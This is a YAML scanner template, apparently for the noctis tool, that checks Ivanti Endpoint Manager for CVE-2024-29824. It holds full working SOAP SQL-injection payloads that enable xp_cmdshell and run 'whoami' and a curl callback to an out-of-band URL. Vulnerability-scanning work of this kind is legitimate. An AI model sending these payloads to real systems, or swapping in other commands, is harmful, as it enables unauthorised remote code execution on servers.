tests/cve/CVE-2024-29824.yaml

# Ivanti Endpoint Manager SQL Injection → xp_cmdshell RCE — CVE-2024-29824
#
# The UpdateStatusEvents SOAP action in EventHandler.asmx passes the <status>
# parameter unsanitised into a SQL Server stored procedure, enabling stacked
# injection. The injection enables xp_cmdshell via sp_configure and executes
# arbitrary commands as the SQL Server service account.
#
# Affected: Ivanti EPM 2022 SU5 and earlier. KEV added: 2024-10-02. EPSS: 1.000.
#
# Detection:
#   1. SOAP response includes UpdateStatusEventsResponse → endpoint accepts the
#      payload, SQL injection likely executed (QoD 50)
#   2. OOB HTTP callback via curl in xp_cmdshell confirms RCE (QoD 97)
#
# Body field uses strict interpolation in noctis: OOB URL must be in a separate
# step guarded by condition: "oob_enabled" to avoid template errors on non-OOB
# scans where {{oob_url}} is undefined.
uid: 4a9c5948-c31e-4d72-ba28-ff094ca1dd04
name: "Ivanti EPM EventHandler SOAP SQLi → xp_cmdshell RCE (CVE-2024-29824)"
description: |
  Tests Ivanti Endpoint Manager for unauthenticated SQL injection in the
  UpdateStatusEvents SOAP action. A stacked injection in the <status> field
  enables xp_cmdshell. An OOB HTTP callback via curl confirms code execution.
type: cve
cve: CVE-2024-29824
cvss: 9.6
severity: critical
confidence_base: 0.20
tags: [ivanti, epm, sqli, xp-cmdshell, rce, soap, oob, kev]
services: [http, https]
author: noctis
version: "1.0.0"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-29824"
  - "https://forums.ivanti.com/s/article/Security-Advisory-May-2024"
  - "https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/"
  - "https://github.com/horizon3ai/CVE-2024-29824"
  - "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-29824.yaml"

steps:
  # ── Primary probe: SQL injection without OOB reference (safe for all hosts) ──
  # body: uses strict interpolation — {{oob_url}} must NOT appear here since it
  # is undefined when OOB is disabled, which would cause the step to fail.
  - id: sqli-probe
    action: http_request
    method: POST
    path: "/WSStatusEvents/EventHandler.asmx"
    port: "{{port}}"
    tls_insecure: true
    follow_redirects: false
    timeout_secs: 15
    headers:
      Content-Type: "application/soap+xml; charset=utf-8"
    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\"><soap12:Body><UpdateStatusEvents xmlns=\"http://tempuri.org/\"><deviceID>noctis</deviceID><actions><Action name=\"noctis\" code=\"0\" date=\"0\" type=\"96\" user=\"noctis\" configguid=\"noctis\" location=\"noctis\"><status>GoodApp=1|md5=''; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--</status></Action></actions></UpdateStatusEvents></soap12:Body></soap12:Envelope>"
    store_as: soap_resp

  # Endpoint accepted the SQLi payload and returned a SOAP envelope (QoD 50)
  - id: soap-response-match
    action: match
    source: soap_resp.body
    pattern: "UpdateStatusEventsResponse"
    condition: "soap_resp.status == 200"
    on_match:
      finding:
        confidence_delta: 0.30
        qod: 50
        evidence: "Ivanti EPM SOAP endpoint responded with UpdateStatusEventsResponse — SQLi payload accepted: {{soap_resp.body}}"

  # ── OOB probe: inject curl callback to confirm xp_cmdshell RCE ─────────────
  # Guarded by oob_enabled — {{oob_url}} is only defined when OOB is active.
  - id: sqli-probe-oob
    action: http_request
    method: POST
    path: "/WSStatusEvents/EventHandler.asmx"
    port: "{{port}}"
    tls_insecure: true
    follow_redirects: false
    timeout_secs: 15
    headers:
      Content-Type: "application/soap+xml; charset=utf-8"
    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\"><soap12:Body><UpdateStatusEvents xmlns=\"http://tempuri.org/\"><deviceID>noctis</deviceID><actions><Action name=\"noctis\" code=\"0\" date=\"0\" type=\"96\" user=\"noctis\" configguid=\"noctis\" location=\"noctis\"><status>GoodApp=1|md5=''; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'curl {{oob_url}}'--</status></Action></actions></UpdateStatusEvents></soap12:Body></soap12:Envelope>"
    condition: "oob_enabled"
    store_as: soap_oob_resp

  # OOB HTTP callback received — confirms xp_cmdshell executed the curl command
  - id: wait-callback
    action: wait_oob
    oob_timeout_secs: 20
    store_as: oob_result
    condition: "oob_enabled"
    on_success:
      finding:
        confidence_delta: 0.75
        qod: 97
        evidence: "xp_cmdshell RCE confirmed — OOB HTTP callback received: {{oob_result.body}}"
      stop: true
